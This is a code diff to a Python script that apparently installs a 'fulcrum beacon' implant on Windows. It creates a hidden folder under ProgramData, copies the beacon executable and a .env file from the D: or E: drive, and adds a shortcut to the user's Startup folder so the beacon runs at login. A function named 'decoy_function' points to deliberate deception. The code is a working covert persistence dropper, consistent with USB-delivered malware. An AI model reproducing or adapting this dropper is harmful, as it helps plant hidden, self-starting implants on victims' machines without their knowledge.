@@ -1,16 +1,13 @@
 import os
-from dotenv import load_dotenv
-import requests
 from win32com.client import Dispatch
 import ctypes
-import sys
 import shutil
 
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
 
-BEACON_FILE_NAME = "file name of your fulcrum beacon"   # like fulcrum_beacon.exe
+BEACON_FILE_NAME = "fulcrum_beacon.exe"   # like fulcrum_beacon.exe
 
 START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
 
@@ -40,16 +37,21 @@ def decoy_function():
 def main():
     if not check_flags():
 
-
         # create new hidden path
         os.mkdir(INSTALL_PATH)
         FILE_ATTRIBUTE_HIDDEN = 0x02
         ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, FILE_ATTRIBUTE_HIDDEN)
 
-        # move fulcrum beacon file
-        shutil.move(BEACON_FILE_NAME, INSTALL_PATH)
-        # move .env file
-        shutil.move(".env", INSTALL_PATH)
+        # copy fulcrum beacon file
+        if os.path.isfile("D:\\.env"):
+            shutil.copy("D:\\" + BEACON_FILE_NAME, INSTALL_PATH)
+        else:
+            shutil.copy("E:\\" + BEACON_FILE_NAME, INSTALL_PATH)
+        # copy .env file
+        if os.path.isfile("D:\\.env"):
+            shutil.copy("D:\\.env", INSTALL_PATH)
+        else:
+            shutil.copy("E:\\.env", INSTALL_PATH)
 
         # add the file to startup using a shortcut in the startup folder
         create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
